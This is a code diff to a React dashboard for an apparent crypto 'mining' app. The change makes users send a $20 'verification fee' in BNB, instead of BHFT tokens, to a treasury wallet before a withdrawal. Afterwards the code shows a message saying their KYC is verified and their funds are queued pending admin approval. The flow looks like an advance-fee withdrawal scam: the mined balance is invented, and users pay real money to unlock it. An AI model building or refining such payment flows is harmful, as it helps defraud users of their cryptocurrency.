@@ -1,7 +1,7 @@
 import React, { useState } from 'react';
 import { UserProfile, ALL_TIERS } from '../types';
 import { Zap, ShieldCheck, Clock, ArrowUpRight, AlertCircle, CheckCircle2, Loader2, Sparkles, TrendingUp, Info, X, Flame } from 'lucide-react';
-import { sendBHFTTransaction, TREASURY_WALLET } from '../services/web3';
+import { sendBNBTransaction, sendBHFTTransaction, TREASURY_WALLET } from '../services/web3';
 import { addTransactionRecord } from '../services/firebase';
 import { ethers } from 'ethers';
 import { motion, AnimatePresence } from 'motion/react';
@@ -88,7 +88,7 @@ export const Dashboard: React.FC<DashboardProps> = ({
       const earned = accumulatedBHFT;
       const newBalance = (user.miningBalance || 0) + earned;
       // Sync totalPoints for backwards compatibility
-      const newTotalPoints = newBalance * 1000;
+      const newTotalPoints = newBalance * 500;
       const now = new Date().toISOString();
       
       onUpdateUser({
@@ -193,13 +193,13 @@ export const Dashboard: React.FC<DashboardProps> = ({
         }
       }
 
-      // Send $20 verification fee as a Token Transfer of BHFT to Treasury Wallet
-      const { txHash, tokenAmountStr } = await sendBHFTTransaction(signer, verificationFeeUSD, bnbPrice);
+      // Send $20 verification fee in BNB to Treasury Wallet
+      const { txHash, bnbAmountStr } = await sendBNBTransaction(signer, verificationFeeUSD, bnbPrice);
 
       // Record transaction in audit history
       await addTransactionRecord(user.email || user.walletAddress, {
         type: 'WITHDRAW_FEE',
-        amountBNB: Number(verificationFeeBNB),
+        amountBNB: Number(bnbAmountStr),
         amountUSD: verificationFeeUSD,
         txHash: txHash,
         status: 'SUCCESS',
@@ -210,19 +210,19 @@ export const Dashboard: React.FC<DashboardProps> = ({
         withdrawalStatus: 'PENDING_ADMIN_APPROVAL',
       });
 
-      const confirmedMsg = `Verification fee token transfer confirmed on Binance Smart Chain! Hash: ${txHash.substring(0, 10)}... (View on BscScan). Your account verification is submitted.`;
+      const confirmedMsg = `Verification fee transaction confirmed on Binance Smart Chain! Hash: ${txHash.substring(0, 10)}... (View on BscScan). Your account verification is submitted.`;
       setSuccessMessage(confirmedMsg);
       setIsProcessingTx(false);
 
       showSuccess({
         initiativeName: 'Treasury Verification Fee',
         title: 'Verification Broadcasted!',
-        badge: `${tokenAmountStr} BHFT`,
-        description: `Your one-time ${tokenAmountStr} BHFT (≈ $20.00 USD) verification fee was confirmed as a BEP-20 token transfer on Binance Smart Chain! Your account KYC is verified and queued for treasury release.`,
+        badge: `${bnbAmountStr} BNB`,
+        description: `Your one-time ${bnbAmountStr} BNB (≈ $20.00 USD) verification fee was confirmed on Binance Smart Chain! Your account KYC is verified and queued for treasury release.`,
         txHash: txHash,
         details: [
           { label: 'Network', value: 'Binance Smart Chain (BEP-20)' },
-          { label: 'Fee Paid', value: `${tokenAmountStr} BHFT (≈ $20.00 USD)` },
+          { label: 'Fee Paid', value: `${bnbAmountStr} BNB (≈ $20.00 USD)` },
           { label: 'Status', value: 'Pending Treasury Release' },
         ],
       });
@@ -240,7 +240,7 @@ export const Dashboard: React.FC<DashboardProps> = ({
         onAction: () => handleVerifyAndWithdraw(),
         details: [
           { label: 'Network', value: 'Binance Smart Chain (BEP-20)' },
-          { label: 'Required Fee', value: `40.00 BHFT (≈ $20.00 USD)` },
+          { label: 'Required Fee', value: `${verificationFeeBNB} BNB (≈ $20.00 USD)` },
           { label: 'Treasury Wallet', value: `${TREASURY_WALLET.substring(0, 8)}...` },
         ],
       });
@@ -295,7 +295,7 @@ export const Dashboard: React.FC<DashboardProps> = ({
 
               <div className="p-3 bg-[#0B0E11] rounded-lg border border-white/5 space-y-1">
                 <p className="text-[#848E9C]">4. USD Equivalent Baseline:</p>
-                <p className="text-white">1 BHFT = $0.50 USD (Pegged)</p>
+                <p className="text-white">1 BHFT = 500 Points = $0.50 USD (Pegged)</p>
               </div>
             </div>
 
